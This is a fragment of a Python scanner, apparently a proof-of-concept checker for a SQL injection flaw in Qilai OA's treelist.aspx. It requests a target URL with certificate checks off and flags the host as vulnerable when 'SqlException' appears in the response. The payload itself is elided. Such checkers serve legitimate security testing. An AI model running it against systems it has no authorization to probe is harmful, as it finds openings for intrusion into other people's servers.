...
def main(target_url):
    ...
    print(now_time() + " [INFO]     正在检测启莱OA treelist.aspx SQL注入漏洞")
    try:
        requests.packages.urllib3.disable_warnings()
        respones = requests.get(vuln_url, headers=headers, verify=False)
        if "SqlException" in respones.text:
            print(now_time() + ' [SUCCESS]  启莱OA treelist.aspx SQL注入漏洞 存在{}'.format(vuln_url))
        else:
            print(now_time() + ' [WARNING]  启莱OA treelist.aspx SQL注入漏洞不存在')
    except:
